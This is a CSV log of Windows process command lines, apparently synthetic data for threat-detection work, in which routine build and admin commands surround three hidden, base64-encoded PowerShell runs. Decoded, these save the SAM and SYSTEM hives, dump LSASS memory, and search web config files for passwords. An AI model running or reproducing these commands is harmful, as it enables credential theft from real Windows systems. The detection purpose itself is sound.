process_name,command_line
tasklist.exe,tasklist /fo table
dotnet.exe,dotnet build platform.sln -c Release
git.exe,git status
net.exe,net use Z: \\fileserver\share
nuget.exe,nuget restore data-pipeline.sln
sqlcmd.exe,"sqlcmd -S db -d worker -Q ""SELECT COUNT(*) FROM dbo.Orders"""
systeminfo.exe,systeminfo
powershell.exe,Get-ChildItem C:\Users\backupadmin\Documents
dotnet.exe,dotnet test
docker.exe,docker build -t auth-svc:42 .
powershell.exe,powershell -nop -w hidden -enc cgBlAGcAIABzAGEAdgBlACAASABLAEwATQBcAFMAQQBNACAAJQBUAEUATQBQACUAXABzAGEAbQAgACYAJgAgAHIAZQBnACAAcwBhAHYAZQAgAEgASwBMAE0AXABTAFkAUwBUAEUATQAgACUAVABFAE0AUAAlAFwAcwB5AHMA
sc.exe,sc query api-gateway
powershell.exe,powershell -nop -w hidden -enc cgB1AG4AZABsAGwAMwAyACAAYwBvAG0AcwB2AGMAcwAuAGQAbABsACwAIABNAGkAbgBpAEQAdQBtAHAAIAAoAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAGwAcwBhAHMAcwApAC4ASQBkACAAJQBUAEUATQBQACUAXABsAC4AZABtAHAAIABmAHUAbABsAA==
powershell.exe,Restart-Service -Name nginx
powershell.exe,Test-Connection -Count 2 db-11
powershell.exe,Get-Service | Where-Object Status -eq Running
powershell.exe,Get-EventLog -LogName Application -Newest 20
nuget.exe,nuget restore infra.sln
ipconfig.exe,ipconfig /all
sqlcmd.exe,"sqlcmd -S db -d redis -Q ""SELECT COUNT(*) FROM dbo.Orders"""
choco.exe,choco install nodejs -y
docker.exe,docker build -t auth-svc:94 .
msbuild.exe,msbuild /t:Rebuild /p:Configuration=Release
where.exe,where python
git.exe,git pull origin main
choco.exe,choco install git-lfs -y
powershell.exe,powershell -nop -w hidden -enc ZgBpAG4AZABzAHQAcgAgAC8AUwAgAC8ASQAgAC8ATQAgACIAcABhAHMAcwB3AG8AcgBkACIAIABDADoAXABpAG4AZQB0AHAAdQBiAFwAKgAuAGMAbwBuAGYAaQBnAA==
docker.exe,docker build -t search:19 .
curl.exe,curl.exe -s http://localhost:5000/health
sqlcmd.exe,"sqlcmd -S db -d nginx -Q ""SELECT COUNT(*) FROM dbo.Orders"""
powershell.exe,Get-Process | Sort-Object CPU -Descending | Select -First 10
